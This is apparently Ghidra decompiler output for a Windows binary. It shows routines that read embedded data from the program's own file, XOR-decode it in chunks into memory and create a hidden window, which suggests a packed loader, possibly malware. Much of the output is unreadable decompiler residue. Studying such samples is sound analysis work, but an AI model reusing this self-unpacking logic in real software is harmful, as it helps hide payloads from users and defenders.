/* AUTOMATIC GHIDRA PSEUDO-C. NOT A COMPILABLE RECOVERED SOURCE TREE.
   Original SHA256 c48eb45e2bb2def17e3b4d77faa049e502751975ff4bdc96fd76fe0ac44d6fcd */

/* VA 004080d0 */

/* WARNING: Control flow encountered bad instruction data */

void FUN_004080d0(void)

{
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}



/* VA 0040c1f0 */

uint __cdecl FUN_0040c1f0(int param_1,int param_2)

{
  uint uVar1;
  undefined4 *puVar2;

  uVar1 = 0;
  if (*(uint *)(param_1 + 0x20c) != 0) {
    puVar2 = (undefined4 *)(param_1 + 0x210);
    do {
      if (*(int *)*puVar2 == param_2) {
        return uVar1;
      }
      uVar1 = uVar1 + 1;
      puVar2 = puVar2 + 1;
    } while (uVar1 < *(uint *)(param_1 + 0x20c));
  }
  return 0xfffffff;
}



/* VA 0040c230 */

uint __cdecl FUN_0040c230(int param_1,uint param_2,short param_3)

{
  uint uVar1;
  undefined4 *puVar2;

  uVar1 = 0;
  if (*(uint *)(param_1 + 0x10) != 0) {
    puVar2 = (undefined4 *)(param_1 + 0x18);
    do {
      if (*(uint *)*puVar2 == param_2) {
        return uVar1;
      }
      if ((param_3 != 0) && (((*(uint *)*puVar2 ^ param_2) & 0x3ff) == 0)) {
        return uVar1;
      }
      uVar1 = uVar1 + 1;
      puVar2 = puVar2 + 1;
    } while (uVar1 < *(uint *)(param_1 + 0x10));
  }
  return 0xfffffff;
}



/* VA 0040c280 */

undefined4 __cdecl FUN_0040c280(int param_1,uint param_2,int param_3,short param_4)

{
  int iVar1;
  uint uVar2;
  undefined4 uVar3;

  uVar3 = 0;
  uVar2 = FUN_0040c230(param_1,param_2,param_4);
  if (uVar2 != 0xfffffff) {
    iVar1 = *(int *)(param_1 + 0x18 + uVar2 * 4);
    uVar2 = FUN_0040c1f0(iVar1,param_3);
    if (uVar2 != 0xfffffff) {
      uVar3 = *(undefined4 *)(*(int *)(iVar1 + 0x210 + uVar2 * 4) + 8);
    }
  }
  return uVar3;
}



/* VA 0040c2d0 */

undefined4 * __cdecl FUN_0040c2d0(int param_1,undefined4 *param_2)

{
  char cVar1;
  undefined4 *puVar2;
  char *pcVar3;
  uint uVar4;
  uint uVar5;
  char *pcVar6;
  char *pcVar7;

  puVar2 = (undefined4 *)FUN_00414db0(0xc);
  if (puVar2 != (undefined4 *)0x0) {
    *puVar2 = *param_2;
    puVar2[1] = param_2[1];
    puVar2[2] = param_2[2];
    pcVar3 = (char *)FUN_00414db0(puVar2[1]);
    puVar2[2] = pcVar3;
    if (pcVar3 != (char *)0x0) {
      uVar4 = 0xffffffff;
      pcVar6 = (char *)(param_2[2] + param_1);
      do {
        pcVar7 = pcVar6;
        if (uVar4 == 0) break;
        uVar4 = uVar4 - 1;
        pcVar7 = pcVar6 + 1;
        cVar1 = *pcVar6;
        pcVar6 = pcVar7;
      } while (cVar1 != '\0');
      uVar4 = ~uVar4;
      pcVar6 = pcVar7 + -uVar4;
      for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {
        *(undefined4 *)pcVar3 = *(undefined4 *)pcVar6;
        pcVar6 = pcVar6 + 4;
        pcVar3 = pcVar3 + 4;
      }
      for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
        *pcVar3 = *pcVar6;
        pcVar6 = pcVar6 + 1;
        pcVar3 = pcVar3 + 1;
      }
      return puVar2;
    }
    FUN_00414d40((undefined *)puVar2);
  }
  return (undefined4 *)0x0;
}



/* VA 0040c350 */

undefined4 * __cdecl FUN_0040c350(int param_1,undefined4 *param_2)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  int iVar3;
  uint uVar4;
  undefined4 *puVar5;

  puVar1 = (undefined4 *)FUN_00414db0(0x260);
  if (puVar1 != (undefined4 *)0x0) {
    puVar5 = param_2;
    puVar2 = puVar1;
    for (iVar3 = 0x98; iVar3 != 0; iVar3 = iVar3 + -1) {
      *puVar2 = *puVar5;
      puVar5 = puVar5 + 1;
      puVar2 = puVar2 + 1;
    }
    uVar4 = 0;
    if (param_2[0x83] != 0) {
      puVar5 = puVar1 + 0x84;
      do {
        puVar2 = FUN_0040c2d0(param_1,(undefined4 *)
                                      (*(int *)(((int)param_2 - (int)puVar1) + (int)puVar5) +
                                      param_1));
        *puVar5 = puVar2;
        if (puVar2 == (undefined4 *)0x0) {
          return puVar1;
        }
        uVar4 = uVar4 + 1;
        puVar5 = puVar5 + 1;
      } while (uVar4 < (uint)param_2[0x83]);
    }
  }
  return puVar1;
}



/* VA 0040c3d0 */

undefined4 * __cdecl FUN_0040c3d0(undefined4 *param_1)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 *puVar4;
  uint uVar5;

  puVar1 = (undefined4 *)FUN_00414db0(0x68);
  if (puVar1 != (undefined4 *)0x0) {
    puVar4 = param_1;
    puVar2 = puVar1;
    for (iVar3 = 0x1a; iVar3 != 0; iVar3 = iVar3 + -1) {
      *puVar2 = *puVar4;
      puVar4 = puVar4 + 1;
      puVar2 = puVar2 + 1;
    }
    uVar5 = 0;
    if (puVar1[4] != 0) {
      puVar4 = puVar1 + 6;
      do {
        puVar2 = FUN_0040c350((int)param_1,
                              (undefined4 *)
                              (*(int *)(((int)param_1 - (int)puVar1) + (int)puVar4) + (int)param_1))
        ;
        *puVar4 = puVar2;
        if (puVar2 == (undefined4 *)0x0) {
          return (undefined4 *)0x0;
        }
        uVar5 = uVar5 + 1;
        puVar4 = puVar4 + 1;
      } while (uVar5 < (uint)puVar1[4]);
      return puVar1;
    }
  }
  return puVar1;
}



/* VA 0040c450 */

undefined4 * FUN_0040c450(void)

{
  undefined4 uVar1;
  char *pcVar2;
  int iVar3;
  char *pcVar4;

  pcVar2 = (char *)FUN_00414db0(0x68);
  if (pcVar2 != (char *)0x0) {
    pcVar4 = pcVar2;
    for (iVar3 = 0x1a; iVar3 != 0; iVar3 = iVar3 + -1) {
      pcVar4[0] = '\0';
      pcVar4[1] = '\0';
      pcVar4[2] = '\0';
      pcVar4[3] = '\0';
      pcVar4 = pcVar4 + 4;
    }
    *(undefined4 *)pcVar2 = s_atad_motsuc_00429188._0_4_;
    *(undefined4 *)(pcVar2 + 4) = s_atad_motsuc_00429188._4_4_;
    uVar1 = s_atad_motsuc_00429188._8_4_;
    pcVar2[0xc] = '\x01';
    pcVar2[0xd] = '\0';
    pcVar2[0xe] = '\0';
    pcVar2[0xf] = '\0';
    pcVar2[0x10] = '\0';
    pcVar2[0x11] = '\0';
    pcVar2[0x12] = '\0';
    pcVar2[0x13] = '\0';
    *(undefined4 *)(pcVar2 + 8) = uVar1;
    pcVar2[0x14] = '\0';
    pcVar2[0x15] = '\0';
    pcVar2[0x16] = '\0';
    pcVar2[0x17] = '\0';
  }
  return (undefined4 *)pcVar2;
}



/* VA 0040c4b0 */

undefined4 * __cdecl FUN_0040c4b0(undefined4 *param_1)

{
  undefined4 *puVar1;

  puVar1 = (undefined4 *)0x0;
  if (param_1[3] == 1) {
    puVar1 = FUN_0040c3d0(param_1);
  }
  return puVar1;
}



/* VA 0040c4d0 */

undefined4 FUN_0040c4d0(void)

{
  return 0x4f7;
}



/* VA 0040c4f0 */

undefined4 FUN_0040c4f0(void)

{
  return 0x3c800;
}



/* VA 0040c510 */

undefined4 * FUN_0040c510(void)

{
  uint nNumberOfBytesToRead;
  DWORD DVar1;
  HANDLE hFile;
  BOOL BVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  CHAR local_110 [260];
  LONG local_c;
  DWORD local_8;

  puVar4 = (undefined4 *)0x0;
  local_8 = 0;
  nNumberOfBytesToRead = FUN_0040c4d0();
  local_c = FUN_0040c4f0();
  DVar1 = GetModuleFileNameA((HMODULE)0x0,local_110,0x104);
  if (DVar1 != 0) {
    hFile = CreateFileA(local_110,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
    if (hFile != (HANDLE)0xffffffff) {
      SetFilePointer(hFile,local_c,(PLONG)0x0,0);
      puVar4 = (undefined4 *)FUN_00414db0(nNumberOfBytesToRead);
      BVar2 = ReadFile(hFile,puVar4,nNumberOfBytesToRead,&local_8,(LPOVERLAPPED)0x0);
      if ((BVar2 == 0) || (local_8 != nNumberOfBytesToRead)) {
        FUN_00414d40((undefined *)puVar4);
        puVar4 = (undefined4 *)0x0;
      }
      CloseHandle(hFile);
    }
  }
  if (puVar4 == (undefined4 *)0x0) {
    puVar4 = FUN_0040c450();
    FUN_00414d40((undefined *)0x0);
    return puVar4;
  }
  puVar3 = FUN_0040c4b0(puVar4);
  FUN_00414d40((undefined *)puVar4);
  return puVar3;
}



/* VA 0040c5f0 */

undefined4 FUN_0040c5f0(void)

{
  return 0x28;
}



/* VA 0040c610 */

undefined4 FUN_0040c610(void)

{
  return 0x3ccf7;
}



/* VA 0040c630 */

undefined * FUN_0040c630(void)

{
  uint nNumberOfBytesToRead;
  DWORD DVar1;
  HANDLE hFile;
  BOOL BVar2;
  undefined *lpBuffer;
  CHAR local_110 [260];
  LONG local_c;
  uint local_8;

  lpBuffer = (undefined *)0x0;
  nNumberOfBytesToRead = FUN_0040c5f0();
  local_c = FUN_0040c610();
  DVar1 = GetModuleFileNameA((HMODULE)0x0,local_110,0x104);
  if (DVar1 != 0) {
    hFile = CreateFileA(local_110,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0x80,(HANDLE)0x0);
    if (hFile != (HANDLE)0xffffffff) {
      SetFilePointer(hFile,local_c,(PLONG)0x0,0);
      lpBuffer = (undefined *)FUN_00414db0(nNumberOfBytesToRead);
      BVar2 = ReadFile(hFile,lpBuffer,nNumberOfBytesToRead,&local_8,(LPOVERLAPPED)0x0);
      if ((BVar2 == 0) || (local_8 != nNumberOfBytesToRead)) {
        FUN_00414d40(lpBuffer);
        lpBuffer = (undefined *)0x0;
      }
      CloseHandle(hFile);
    }
  }
  return lpBuffer;
}



/* VA 0040c6e0 */

/* WARNING: Instruction at (ram,0x0040c738) overlaps instruction at (ram,0x0040c736)
    */
/* WARNING: Removing unreachable block (ram,0x0040c6fb) */
/* WARNING: Removing unreachable block (ram,0x0040c732) */

void __fastcall
FUN_0040c6e0(int param_1,byte param_2,uint param_3,uint param_4,uint param_5,undefined4 *param_6)

{
  int iVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;

  puVar3 = (undefined4 *)(*(int *)(param_3 + 4) + param_4);
  iVar1 = (*DAT_0042ea00)(puVar3);
  if (iVar1 != 0) {
    puVar4 = puVar3;
    for (uVar2 = param_5 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {
      *puVar4 = *param_6;
      param_6 = param_6 + 1;
      puVar4 = puVar4 + 1;
    }
    for (uVar2 = param_5 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {
      *(undefined1 *)puVar4 = *(undefined1 *)param_6;
      param_6 = (undefined4 *)((int)param_6 + 1);
      puVar4 = (undefined4 *)((int)puVar4 + 1);
    }
    (*DAT_0042ea00)(puVar3,param_5,param_3);
  }
  return;
}



/* VA 0040c760 */

/* WARNING: Instruction at (ram,0x0040c781) overlaps instruction at (ram,0x0040c77f)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x0040c79b) */
/* WARNING: Removing unreachable block (ram,0x0040c77b) */

int FUN_0040c760(int param_1,int param_2,uint param_3,undefined4 *param_4)

{
  uint uVar1;
  undefined4 *puVar2;

  puVar2 = (undefined4 *)(*(int *)(param_1 + 4) + param_2);
  for (uVar1 = param_3 >> 2; uVar1 != 0; uVar1 = uVar1 - 1) {
    *param_4 = *puVar2;
    puVar2 = puVar2 + 1;
    param_4 = param_4 + 1;
  }
  for (param_3 = param_3 & 3; param_3 != 0; param_3 = param_3 - 1) {
    *(undefined1 *)param_4 = *(undefined1 *)puVar2;
    puVar2 = (undefined4 *)((int)puVar2 + 1);
    param_4 = (undefined4 *)((int)param_4 + 1);
  }
  return param_1;
}



/* VA 0040c7a0 */

/* WARNING: Instruction at (ram,0x0040c99d) overlaps instruction at (ram,0x0040c99c)
    */
/* WARNING: Removing unreachable block (ram,0x0040c7b9) */
/* WARNING: Removing unreachable block (ram,0x0040c7bd) */
/* WARNING: Removing unreachable block (ram,0x0040c836) */
/* WARNING: Removing unreachable block (ram,0x0040c87e) */
/* WARNING: Removing unreachable block (ram,0x0040c884) */
/* WARNING: Removing unreachable block (ram,0x0040c925) */
/* WARNING: Removing unreachable block (ram,0x0040c7ff) */
/* WARNING: Removing unreachable block (ram,0x0040c8a2) */
/* WARNING: Removing unreachable block (ram,0x0040c963) */
/* WARNING: Removing unreachable block (ram,0x0040c966) */
/* WARNING: Removing unreachable block (ram,0x0040c847) */
/* WARNING: Removing unreachable block (ram,0x0040c8e1) */
/* WARNING: Removing unreachable block (ram,0x0040c8cd) */
/* WARNING: Removing unreachable block (ram,0x0040c938) */
/* WARNING: Removing unreachable block (ram,0x0040c8f9) */
/* WARNING: Removing unreachable block (ram,0x0040c843) */
/* WARNING: Removing unreachable block (ram,0x0040c944) */
/* WARNING: Removing unreachable block (ram,0x0040c853) */
/* WARNING: Removing unreachable block (ram,0x0040c98c) */
/* WARNING: Removing unreachable block (ram,0x0040c8b5) */
/* WARNING: Removing unreachable block (ram,0x0040c950) */
/* WARNING: Removing unreachable block (ram,0x0040c9aa) */
/* WARNING: Removing unreachable block (ram,0x0040c8ed) */
/* WARNING: Removing unreachable block (ram,0x0040c8c1) */
/* WARNING: Type propagation algorithm not settling */

undefined8 FUN_0040c7a0(void)

{
  bool bVar1;
  byte bVar2;
  undefined3 extraout_var;
  uint uVar3;
  uint *extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 uVar4;
  uint unaff_EBX;
  uint unaff_ESI;
  int iVar5;
  uint uVar6;
  bool bVar7;
  undefined8 uVar8;
  byte *in_stack_00000010;
  byte abStackY_1011 [4069];
  undefined4 uStackY_2c;

  FUN_004159a0();
  bVar7 = false;
  uStackY_2c = 0x40c7d6;
  uVar8 = FUN_0041fa00((undefined4 *)&stack0x00000004,1,0,(undefined4 *)&stack0xfffffff0,
                       (uint *)&stack0xfffffff8,(uint *)&stack0xfffffff4);
  uVar4 = (undefined4)((ulonglong)uVar8 >> 0x20);
  iVar5 = (int)uVar8;
  uVar3 = 0;
  if (iVar5 != 0) {
    do {
      bVar1 = FUN_0041fd00((undefined4 *)&stack0x00000004,iVar5,in_stack_00000010);
      uVar3 = CONCAT31(extraout_var,bVar1);
      if (uVar3 != 0) {
        bVar7 = true;
        uVar4 = extraout_EDX;
        goto LAB_0040c837;
      }
      uStackY_2c = 0x40c81b;
      uVar8 = FUN_0041fa00((undefined4 *)&stack0x00000004,1,iVar5 + 0x28,
                           (undefined4 *)&stack0xfffffff0,(uint *)&stack0xfffffff8,
                           (uint *)&stack0xfffffff4);
      uVar4 = (undefined4)((ulonglong)uVar8 >> 0x20);
      iVar5 = (int)uVar8;
    } while (iVar5 != 0);
    uVar3 = 0;
  }
LAB_0040c837:
  if (!bVar7) {
    return CONCAT44(uVar4,uVar3);
  }
  do {
    while( true ) {
      if (unaff_EBX == 0) {
        return CONCAT44(uVar4,uVar3);
      }
      uVar6 = unaff_EBX;
      if (0xfff < unaff_EBX) {
        uVar6 = 0x1000;
      }
      FUN_0040c760();
      bVar2 = abStackY_1011[1];
      abStackY_1011[1] = abStackY_1011[1] ^ 0x43;
      bVar2 = bVar2 ^ 0x56;
      uVar3 = 1;
      bVar7 = 1 < uVar6;
      while (bVar7) {
        abStackY_1011[uVar3 + 1] = abStackY_1011[uVar3 + 1] ^ abStackY_1011[uVar3];
        abStackY_1011[uVar3 + 1] = abStackY_1011[uVar3 + 1] + bVar2;
        bVar2 = bVar2 + abStackY_1011[uVar3 + 1];
        uVar3 = uVar3 + 1;
        bVar7 = uVar3 < uVar6;
      }
      uVar8 = FUN_0040c6e0(unaff_ESI,(byte)&stack0x00000004,(uint)&stack0x00000004,unaff_ESI,uVar6,
                           (undefined4 *)((int)abStackY_1011 + 1));
      uVar4 = (undefined4)((ulonglong)uVar8 >> 0x20);
      uVar3 = (uint)uVar8;
      unaff_EBX = unaff_EBX - uVar6;
      bVar7 = (POPCOUNT(unaff_EBX & 0xff) & 1U) == 0;
      if (!bVar7) break;
code_r0x0040c992:
      unaff_ESI = unaff_ESI + uVar6;
    }
    do {
      if (!bVar7) goto code_r0x0040c992;
      uVar3 = uVar3 & *extraout_ECX;
      bVar7 = (POPCOUNT(uVar3 & 0xff) & 1U) == 0;
    } while (uVar3 != 0);
  } while( true );
}



/* VA 0040c9c0 */

undefined4 __cdecl FUN_0040c9c0(HINSTANCE param_1,HWND param_2,LPCSTR param_3)

{
  ATOM AVar1;
  HWND hWnd;
  int iVar2;
  WNDCLASSA *pWVar3;
  WNDCLASSA local_30;
  undefined4 local_8;

  pWVar3 = &local_30;
  for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {
    pWVar3->style = 0;
    pWVar3 = (WNDCLASSA *)&pWVar3->lpfnWndProc;
  }
  local_30.lpfnWndProc = DefWindowProcA_exref;
  local_8 = 0;
  local_30.lpszClassName = param_3;
  local_30.hInstance = param_1;
  local_30.hCursor = (HCURSOR)0x0;
  local_30.hIcon = (HICON)0x0;
  local_30.lpszMenuName = (LPCSTR)0x0;
  local_30.hbrBackground = (HBRUSH)0xf;
  local_30.style = 0;
  local_30.cbClsExtra = 0xc;
  local_30.cbWndExtra = 0xc;
  AVar1 = RegisterClassA(&local_30);
  if (AVar1 != 0) {
    hWnd = CreateWindowExA(0,param_3,param_3,0,-0x80000000,-0x80000000,-0x80000000,-0x80000000,
                           param_2,(HMENU)0x0,param_1,(LPVOID)0x0);
    if (hWnd != (HWND)0x0) {
      ShowWindow(hWnd,0);
      return 1;
    }
  }
  return local_8;
}



/* VA 0040ca70 */

/* WARNING: Instruction at (ram,0x0040cdf1) overlaps instruction at (ram,0x0040cdf0)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Unable to track spacebase fully for stack */
/* WARNING: Removing unreachable block (ram,0x0040ce29) */
/* WARNING: Removing unreachable block (ram,0x0040ce11) */
/* WARNING: Removing unreachable block (ram,0x0040cdf9) */
/* WARNING: Removing unreachable block (ram,0x0040cdc9) */
/* WARNING: Removing unreachable block (ram,0x0040cdb1) */
/* WARNING: Removing unreachable block (ram,0x0040cd99) */
/* WARNING: Removing unreachable block (ram,0x0040cd81) */
/* WARNING: Removing unreachable block (ram,0x0040cd69) */
/* WARNING: Removing unreachable block (ram,0x0040cd45) */
/* WARNING: Removing unreachable block (ram,0x0040cd2d) */
/* WARNING: Removing unreachable block (ram,0x0040cd09) */
/* WARNING: Removing unreachable block (ram,0x0040cce5) */
/* WARNING: Removing unreachable block (ram,0x0040cccd) */
/* WARNING: Removing unreachable block (ram,0x0040cc85) */
/* WARNING: Removing unreachable block (ram,0x0040cc79) */
/* WARNING: Removing unreachable block (ram,0x0040cc61) */
/* WARNING: Removing unreachable block (ram,0x0040cc49) */
/* WARNING: Removing unreachable block (ram,0x0040cc31) */
/* WARNING: Removing unreachable block (ram,0x0040cbf0) */
/* WARNING: Removing unreachable block (ram,0x0040cbe4) */
/* WARNING: Removing unreachable block (ram,0x0040cbcc) */
/* WARNING: Removing unreachable block (ram,0x0040cbb4) */
/* WARNING: Removing unreachable block (ram,0x0040cb78) */
/* WARNING: Removing unreachable block (ram,0x0040cb60) */
/* WARNING: Removing unreachable block (ram,0x0040cb3c) */
/* WARNING: Removing unreachable block (ram,0x0040cb30) */
/* WARNING: Removing unreachable block (ram,0x0040cb0c) */
/* WARNING: Removing unreachable block (ram,0x0040caf4) */
/* WARNING: Removing unreachable block (ram,0x0040cadc) */
/* WARNING: Removing unreachable block (ram,0x0040caa0) */
/* WARNING: Removing unreachable block (ram,0x0040caac) */
/* WARNING: Removing unreachable block (ram,0x0040cab8) */
/* WARNING: Removing unreachable block (ram,0x0040cad0) */
/* WARNING: Removing unreachable block (ram,0x0040cae8) */
/* WARNING: Removing unreachable block (ram,0x0040cb00) */
/* WARNING: Removing unreachable block (ram,0x0040cb24) */
/* WARNING: Removing unreachable block (ram,0x0040cb6c) */
/* WARNING: Removing unreachable block (ram,0x0040cb84) */
/* WARNING: Removing unreachable block (ram,0x0040cb90) */
/* WARNING: Removing unreachable block (ram,0x0040cba8) */
/* WARNING: Removing unreachable block (ram,0x0040cbc0) */
/* WARNING: Removing unreachable block (ram,0x0040cbd8) */
/* WARNING: Removing unreachable block (ram,0x0040cc08) */
/* WARNING: Removing unreachable block (ram,0x0040cc25) */
/* WARNING: Removing unreachable block (ram,0x0040cc3d) */
/* WARNING: Removing unreachable block (ram,0x0040cc55) */
/* WARNING: Removing unreachable block (ram,0x0040cc6d) */
/* WARNING: Removing unreachable block (ram,0x0040cc9d) */
/* WARNING: Removing unreachable block (ram,0x0040ccc1) */
/* WARNING: Removing unreachable block (ram,0x0040ccd9) */
/* WARNING: Removing unreachable block (ram,0x0040ccfd) */
/* WARNING: Removing unreachable block (ram,0x0040cd21) */
/* WARNING: Removing unreachable block (ram,0x0040cd39) */
/* WARNING: Removing unreachable block (ram,0x0040cd5d) */
/* WARNING: Removing unreachable block (ram,0x0040cd75) */
/* WARNING: Removing unreachable block (ram,0x0040cd8d) */
/* WARNING: Removing unreachable block (ram,0x0040cda5) */
/* WARNING: Removing unreachable block (ram,0x0040cdbd) */
/* WARNING: Removing unreachable block (ram,0x0040cded) */
/* WARNING: Removing unreachable block (ram,0x0040ce05) */
/* WARNING: Removing unreachable block (ram,0x0040ce1d) */
/* WARNING: Heritage AFTER dead removal. Example location: s0x00000000 : 0x0040cc0f */
/* WARNING: Removing unreachable block (ram,0x0040cc91) */
/* WARNING: Removing unreachable block (ram,0x0040cd51) */
/* WARNING: Removing unreachable block (ram,0x0040ce35) */
/* WARNING: Removing unreachable block (ram,0x0040ccf1) */
/* WARNING: Removing unreachable block (ram,0x0040cb9c) */
/* WARNING: Removing unreachable block (ram,0x0040cb18) */
/* WARNING: Removing unreachable block (ram,0x0040cbfc) */
/* WARNING: Removing unreachable block (ram,0x0040cca9) */
/* WARNING: Removing unreachable block (ram,0x0040cdd5) */
/* WARNING: Removing unreachable block (ram,0x0040cd15) */
/* WARNING: Removing unreachable block (ram,0x0040cb48) */
/* WARNING: Removing unreachable block (ram,0x0040cac4) */
/* WARNING: Removing unreachable block (ram,0x0040ccb5) */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

undefined1 * __fastcall FUN_0040ca70(uint param_1,undefined2 param_2)

{
  code *pcVar1;
  byte bVar2;
  byte *in_EAX;
  undefined1 *puVar3;
  int unaff_EBX;
  undefined4 *unaff_ESI;
  bool in_PF;
  bool bVar4;
  int unaff_retaddr;
  undefined1 *puStack_8;

  bVar2 = (byte)in_EAX;
  if ((!in_PF) && (in_PF)) {
    in_EAX[-0x15] = in_EAX[-0x15] & (byte)param_2;
    *in_EAX = *in_EAX | bVar2;
    *in_EAX = *in_EAX + bVar2;
    *in_EAX = *in_EAX + bVar2;
    *in_EAX = *in_EAX + bVar2;
    in_EAX[-0x1d] = in_EAX[-0x1d] + (char)(param_1 >> 8);
    out(*unaff_ESI,param_2);
    pcVar1 = (code *)swi(3);
    puVar3 = (undefined1 *)(*pcVar1)();
    return puVar3;
  }
  if ((!in_PF) && (in_PF)) {
    *(int *)(unaff_EBX + 4) = *(int *)(unaff_EBX + 4) >> 7;
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  bVar4 = (POPCOUNT((unaff_retaddr >> 0x1f) * -0x10 - 4U & 0xff) & 1U) == 0;
  if ((!bVar4) && (bVar4)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  DAT_f687047b = DAT_f687047b;
  DAT_db87047b = DAT_db87047b;
  uRamc987047b = uRamc987047b;
  uRam83c58b50 = uRam83c58b50;
  return puStack_8;
}



/* VA 0040ce40 */

/* WARNING: Instruction at (ram,0x0040e264) overlaps instruction at (ram,0x0040e263)
    */
/* WARNING: Control flow encountered bad instruction data */
/* WARNING: Removing unreachable block (ram,0x0040d8ea) */
/* WARNING: Removing unreachable block (ram,0x0040d8ee) */
/* WARNING: Removing unreachable block (ram,0x0040e9b5) */
/* WARNING: Removing unreachable block (ram,0x0040e9b9) */
/* WARNING: Removing unreachable block (ram,0x0040de72) */
/* WARNING: Removing unreachable block (ram,0x0040de76) */
/* WARNING: Removing unreachable block (ram,0x0040d902) */
/* WARNING: Removing unreachable block (ram,0x0040d906) */
/* WARNING: Removing unreachable block (ram,0x0040d3a4) */
/* WARNING: Removing unreachable block (ram,0x0040d3e0) */
/* WARNING: Removing unreachable block (ram,0x0040d8f6) */
/* WARNING: Removing unreachable block (ram,0x0040d90e) */
/* WARNING: Removing unreachable block (ram,0x0040d912) */
/* WARNING: Removing unreachable block (ram,0x0040e9cd) */
/* WARNING: Removing unreachable block (ram,0x0040e9d1) */
/* WARNING: Removing unreachable block (ram,0x0040e9c1) */
/* WARNING: Removing unreachable block (ram,0x0040ed67) */
/* WARNING: Removing unreachable block (ram,0x0040ecc2) */
/* WARNING: Removing unreachable block (ram,0x0040ec92) */
/* WARNING: Removing unreachable block (ram,0x0040ec6e) */
/* WARNING: Removing unreachable block (ram,0x0040ec56) */
/* WARNING: Removing unreachable block (ram,0x0040ec3e) */
/* WARNING: Removing unreachable block (ram,0x0040ec4a) */
/* WARNING: Removing unreachable block (ram,0x0040eafe) */
/* WARNING: Removing unreachable block (ram,0x0040eb8e) */
/* WARNING: Removing unreachable block (ram,0x0040eb2e) */
/* WARNING: Removing unreachable block (ram,0x0040eae6) */
/* WARNING: Removing unreachable block (ram,0x0040ea85) */
/* WARNING: Removing unreachable block (ram,0x0040ea6d) */
/* WARNING: Removing unreachable block (ram,0x0040ea49) */
/* WARNING: Removing unreachable block (ram,0x0040ea31) */
/* WARNING: Removing unreachable block (ram,0x0040ea19) */
/* WARNING: Removing unreachable block (ram,0x0040ea01) */
/* WARNING: Removing unreachable block (ram,0x0040e959) */
/* WARNING: Removing unreachable block (ram,0x0040e941) */
/* WARNING: Removing unreachable block (ram,0x0040e911) */
/* WARNING: Removing unreachable block (ram,0x0040e8f9) */
/* WARNING: Removing unreachable block (ram,0x0040e8e1) */
/* WARNING: Removing unreachable block (ram,0x0040e8c9) */
/* WARNING: Removing unreachable block (ram,0x0040e8b1) */
/* WARNING: Removing unreachable block (ram,0x0040e851) */
/* WARNING: Removing unreachable block (ram,0x0040e859) */
/* WARNING: Removing unreachable block (ram,0x0040e89b) */
/* WARNING: Removing unreachable block (ram,0x0040e839) */
/* WARNING: Removing unreachable block (ram,0x0040e821) */
/* WARNING: Removing unreachable block (ram,0x0040e809) */
/* WARNING: Removing unreachable block (ram,0x0040e7f1) */
/* WARNING: Removing unreachable block (ram,0x0040e7d9) */
/* WARNING: Removing unreachable block (ram,0x0040e7c1) */
/* WARNING: Removing unreachable block (ram,0x0040e7a9) */
/* WARNING: Removing unreachable block (ram,0x0040e785) */
/* WARNING: Removing unreachable block (ram,0x0040e757) */
/* WARNING: Removing unreachable block (ram,0x0040e73f) */
/* WARNING: Removing unreachable block (ram,0x0040e727) */
/* WARNING: Removing unreachable block (ram,0x0040e70f) */
/* WARNING: Removing unreachable block (ram,0x0040e6eb) */
/* WARNING: Removing unreachable block (ram,0x0040e6d3) */
/* WARNING: Removing unreachable block (ram,0x0040e6bb) */
/* WARNING: Removing unreachable block (ram,0x0040e6a3) */
/* WARNING: Removing unreachable block (ram,0x0040e673) */
/* WARNING: Removing unreachable block (ram,0x0040e64f) */
/* WARNING: Removing unreachable block (ram,0x0040e637) */
/* WARNING: Removing unreachable block (ram,0x0040e613) */
/* WARNING: Removing unreachable block (ram,0x0040e5ef) */
/* WARNING: Removing unreachable block (ram,0x0040e5cb) */
/* WARNING: Removing unreachable block (ram,0x0040e595) */
/* WARNING: Removing unreachable block (ram,0x0040e57d) */
/* WARNING: Removing unreachable block (ram,0x0040e565) */
/* WARNING: Removing unreachable block (ram,0x0040e54d) */
/* WARNING: Removing unreachable block (ram,0x0040e51d) */
/* WARNING: Removing unreachable block (ram,0x0040e505) */
/* WARNING: Removing unreachable block (ram,0x0040e4ed) */
/* WARNING: Removing unreachable block (ram,0x0040e4d5) */
/* WARNING: Removing unreachable block (ram,0x0040e4bd) */
/* WARNING: Removing unreachable block (ram,0x0040e4a5) */
/* WARNING: Removing unreachable block (ram,0x0040e48d) */
/* WARNING: Removing unreachable block (ram,0x0040e475) */
/* WARNING: Removing unreachable block (ram,0x0040e45d) */
/* WARNING: Removing unreachable block (ram,0x0040e42d) */
/* WARNING: Removing unreachable block (ram,0x0040e415) */
/* WARNING: Removing unreachable block (ram,0x0040e3fd) */
/* WARNING: Removing unreachable block (ram,0x0040e3d7) */
/* WARNING: Removing unreachable block (ram,0x0040e3bf) */
/* WARNING: Removing unreachable block (ram,0x0040e3a7) */
/* WARNING: Removing unreachable block (ram,0x0040e383) */
/* WARNING: Removing unreachable block (ram,0x0040e36b) */
/* WARNING: Removing unreachable block (ram,0x0040e353) */
/* WARNING: Removing unreachable block (ram,0x0040e33b) */
/* WARNING: Removing unreachable block (ram,0x0040e323) */
/* WARNING: Removing unreachable block (ram,0x0040e30b) */
/* WARNING: Removing unreachable block (ram,0x0040e2f3) */
/* WARNING: Removing unreachable block (ram,0x0040e2db) */
/* WARNING: Removing unreachable block (ram,0x0040e2b7) */
/* WARNING: Removing unreachable block (ram,0x0040e29f) */
/* WARNING: Removing unreachable block (ram,0x0040e23e) */
/* WARNING: Removing unreachable block (ram,0x0040e20e) */
